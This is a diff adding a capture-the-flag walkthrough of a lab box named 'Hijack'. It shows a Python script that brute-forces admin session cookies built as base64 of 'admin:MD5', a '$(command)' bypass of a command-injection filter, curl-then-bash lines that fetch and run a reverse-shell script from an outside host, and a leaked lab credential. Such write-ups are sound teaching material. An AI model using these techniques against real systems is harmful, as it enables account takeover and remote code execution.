@@ -73,15 +73,115 @@ Going over to port 80 which is the webserver shows this
 So we can either login or create account
 
 To save us the trouble of stress I just created an account
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a3eacd5d-3855-46c1-a80b-ab25babd3251)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/acd32ee8-8000-4d1f-83fc-508b12e7e482)
 
-Now we can login with the credential `uche:markuche`
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aa98afea-bc68-4855-833f-aeac86facbca)
+Now we can login with the credential `mud:password`
 
 One thing you'd immediately notice is the `Administration` panel 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fba37f5b-b7aa-4b45-a391-1267433727ea)
 
 If you click that you'd see this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/181bbdb4-03f8-4d64-abce-7be6898894b3)
 
+So we need to be logged in as admin before we can access that
+
+Often when webapp checks this kind of permission it either gets it from a database or it can be the cookie 
+
+Since we have no sort of database access here I checked the cookie and saw this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd98d584-a07d-43ab-a9b8-9b5f4ef25d78)
+
+Normally when I see `PHPSESSID` as the cookie name I don't really check it because it's usually some random value but that isn't the case here
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee5af735-fbb5-441b-8d6e-17610f0caeea)
+
+From cyberchef we can see that it decoded from base64 and has `admin` + `:` + some_hash_value
+
+Using [crackstation](https://crackstation.net/) the hash decoded to `password` and I got the hash type to be `MD5`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f1f459d-5286-4ca1-ba89-f091a239d39e)
+
+At this point we can either do two things:
+- Brute force the admin account
+- Do some cookie forgery till we get the right admin cookie session
+
+The first case won't be of benefit to us as there's going to be rate limit according to the note from admin 
+
+But the other case will work cause the rate limit is just placed on the login page but not the amount of time you access the web page which makes sense
+
+Now inorder to do that we need to convert `admin:{md5_of_password}` to base64 then make a `GET` request to `/` and if we get a content length which differs from the preceding one then we have our right session
+
+I wrote a python script to do that:
+
+```python
+import requests
+import hashlib
+from base64 import b64encode as encode
+
+url = "http://10.10.182.53/index.php"
+
+with open("passwords.txt", 'r') as fp:
+    for password in fp:
+        passwd = password.strip('\n').encode()
+        hash = hashlib.md5(passwd).hexdigest()
+        value = f"admin:{hash}"
+        payload = encode(value.encode())
+        cookie = {"PHPSESSID": payload.decode()}
+        req = requests.get(url, cookies=cookie)
+        
+        if len(req.text) != 487:
+            print(f"Potential Cookie: {payload.decode()}")
+            break
+```
+
+After running it I got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9042b0c-a755-44d1-be8d-37b3539c7d80)
+
+```
+➜  Hijack python3 check.py
+Potential Cookie: YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
+➜  Hijack
+```
+
+Now we can change the cookie to that and should be logged in as admin
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/574d00ce-0b6a-4eb4-a0d9-dba14c716239)
+
+Cool let us access the administrator panel
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9420e836-d8a0-46fc-b06f-feb34c254174)
+
+That claims to do a service check on the provided service name
+
+I put `apache` since that's currently running and it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f6434c93-9c0e-4937-a940-31016f972937)
+
+This tells us that it is likely running a bash command with our argument provided
+
+This means we can try inject our own command leading to command injection
+
+I first tried the generic payload `;` and got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/607e756f-7866-42d4-b3e6-68dfaaabd0bd)
+
+```
+Command injection detected, please provide a service.
+```
+
+Fancy! This can be bypassed easily using `$(command)`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/295f54d7-ea98-4b9e-85ad-ddca20bd2818)
+
+So I just got a reverse shell
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a307f94-9fa3-45d5-a3f0-9c40a7c983b0)
+
+```
+- $(curl 10.6.80.113/rev.sh -o /tmp/a)
+- $(bash /tmp/a)
+```
+
+In the current directory of the web app shows a configuration file which holds mysql credential
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9a556c0a-d549-4193-aeb7-0f3807b9e83a)
+
+Using the password worked for user `rick` and we can now grab the user flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46ef276a-6fd6-451d-b8b6-adbc49675955)
+
+```
+rick:N3v3rG0nn4G1v3Y0uUp
+```
 
 
 
